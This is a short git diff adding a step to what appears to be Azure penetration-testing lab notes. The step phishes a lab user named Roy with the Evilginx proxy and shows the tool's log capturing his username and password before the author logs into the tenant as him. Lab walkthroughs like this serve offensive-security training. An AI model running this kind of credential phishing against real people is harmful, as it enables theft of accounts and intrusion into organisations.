@@ -918,3 +918,17 @@ Get some more details about the user Roy:
 ```
 Get-AzureADUser -ObjectId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *
 ```
+### Phish and use Roys creds
+
+We phish Roy using [Evilginx](https://github.com/conma293/Azure/blob/main/2.12_Evilginx2.md) to get his credentials!
+
+```
+[04:32:13] [imp] [0] [o365] new visitor has arrived: python-requests/2.25.1 (172.16.2.113)
+[04:32:13] [inf] [0] [o365] landing URL: https://login.login.student213.corp/rcewDmff
+[04:32:43] [+++] [0] Password: [Auth3nticatedPers0n@InDefHQtenant]
+[04:32:43] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
+[04:32:43] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
+```
+
+Now we can connect to target Tenant as Roy
+
